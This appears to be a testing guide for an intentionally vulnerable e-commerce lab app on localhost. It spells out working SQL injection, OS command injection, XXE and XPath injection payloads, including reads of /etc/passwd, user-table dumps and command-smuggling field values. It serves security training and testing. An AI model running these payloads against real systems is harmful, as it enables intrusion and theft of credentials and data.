# Setup and Testing Guide

## Quick Start

### 1. Start the Application
```bash
cd machines/test-subject-1
docker-compose up -d
```

Wait about 30 seconds for the services to initialize.

### 2. Verify Services are Running
```bash
# Check API health
curl http://localhost:3000/health

# Expected response:
# {"status":"ok","timestamp":"..."}
```

### 3. Create Admin User

The application needs an admin user to test some vulnerabilities. You have two options:

#### Option A: Create via API and Update Database
```bash
# 1. Register a new user
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com",
    "password": "Admin123!",
    "firstName": "Admin",
    "lastName": "User"
  }'

# 2. Access MySQL and update role
docker exec -it ecommerce_mysql mysql -u ecommerce_user -pecommerce_pass ecommerce_db

# 3. In MySQL prompt, run:
UPDATE users SET role = 'admin' WHERE email = 'admin@test.com';
exit;
```

#### Option B: Direct Database Insert
```bash
# Access MySQL
docker exec -it ecommerce_mysql mysql -u ecommerce_user -pecommerce_pass ecommerce_db

# Insert admin user (password is: Admin123!)
INSERT INTO users (email, password, first_name, last_name, role) VALUES 
('admin@test.com', '$2b$10$YourHashedPasswordHere', 'Admin', 'User', 'admin');
exit;
```

### 4. Get Admin JWT Token
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com",
    "password": "Admin123!"
  }'

# Save the token from the response
```

## Testing Each Vulnerability

### 1. SQL Injection (No Auth Required)

```bash
# Basic test - get all products
curl "http://localhost:3000/api/products/search?query=test'%20OR%20'1'='1"

# Extract users
curl "http://localhost:3000/api/products/search?query=x'%20UNION%20SELECT%20id,email,password,first_name,last_name,phone,role,created_at%20FROM%20users--"

# Extract table names
curl "http://localhost:3000/api/products/search?query=x'%20UNION%20SELECT%20table_name,2,3,4,5,6,7,8%20FROM%20information_schema.tables%20WHERE%20table_schema='ecommerce_db'--"
```

### 2. OS Command Injection #1 - System Info (Admin Required)

```bash
# Replace YOUR_TOKEN with actual admin JWT
TOKEN="your_admin_jwt_token"

# Basic command execution
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=whoami"

# Read files
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=cat%20/etc/passwd"

# Command chaining
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=ls;pwd;whoami"
```

### 3. OS Command Injection #2 - Log Export (Admin Required)

```bash
TOKEN="your_admin_jwt_token"

# Inject command via filename
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "logs.txt; cat /etc/hostname"}'

# Multiple commands
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "logs.txt; ls -la /tmp; echo done"}'
```

### 4. OS Command Injection #3 - Backup (Admin Required)

```bash
TOKEN="your_admin_jwt_token"

# Inject via email parameter
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "backupName": "test_backup",
    "email": "test@example.com; echo INJECTED > /tmp/pwned.txt"
  }'
```

### 5. XXE Injection #1 - Sales Report (Admin Required)

```bash
TOKEN="your_admin_jwt_token"

# Read /etc/hostname
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><salesReport><reportName>&xxe;</reportName><period>Q1 2024</period><totalSales>50000</totalSales></salesReport>"
  }'

# Read application files
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/package.json\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>"
  }'
```

### 6. XXE Injection #2 - Product Import (Admin Required)

```bash
TOKEN="your_admin_jwt_token"

# Basic XXE
curl -X POST http://localhost:3000/api/reports/import-products \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><products><product><name>&xxe;</name><description>Test</description><price>99</price><stock>10</stock></product></products>"
  }'
```

### 7. XPath Injection (Auth Required)

```bash
# First create a regular user and get token
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@test.com",
    "password": "User123!",
    "firstName": "Test",
    "lastName": "User"
  }'

# Login
LOGIN=$(curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@test.com", "password": "User123!"}')

# Extract token and use it
TOKEN=$(echo $LOGIN | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# XPath injection - get all users
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20or%20'1'='1"

# Extract specific data
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=']%20|%20//user%20|%20//user[username='"
```

## Using the Test Script

A bash script is provided to test all vulnerabilities:

```bash
# Make it executable
chmod +x test-vulnerabilities.sh

# Run tests
./test-vulnerabilities.sh http://localhost:3000
```

## Automated Testing with Tools

### SQLMap (SQL Injection)
```bash
sqlmap -u "http://localhost:3000/api/products/search?query=test" \
  --batch --level=5 --risk=3
```

### Burp Suite
1. Configure browser to use Burp proxy
2. Navigate to the application
3. Send requests to Repeater/Intruder
4. Modify parameters to test injections

### OWASP ZAP
1. Set target URL: http://localhost:3000
2. Run Active Scan
3. Review alerts for injection vulnerabilities

## Stopping the Application

```bash
docker-compose down

# To remove all data
docker-compose down -v
```

## Troubleshooting

### Services Not Starting
```bash
# Check logs
docker-compose logs -f

# Restart services
docker-compose restart
```

### Database Connection Issues
```bash
# Check MySQL is ready
docker exec ecommerce_mysql mysqladmin ping -h localhost

# Reinitialize database
docker-compose exec api npm run init-db
```

### Cannot Create Admin User
```bash
# Access database directly
docker exec -it ecommerce_mysql mysql -u root -proot_password

USE ecommerce_db;
SELECT * FROM users;
UPDATE users SET role = 'admin' WHERE id = 1;
```

## Security Considerations

⚠️ **WARNING**: This application contains intentional vulnerabilities and should:
- NEVER be deployed to production
- NEVER be exposed to the internet
- Only be run in isolated testing environments
- Be destroyed after testing is complete

## Additional Resources

- See `ALL_VULNERABILITIES.md` for detailed vulnerability documentation
- See `VULNERABILITY_DETAILS.md` for SQL injection specifics
- See `README.md` for application overview
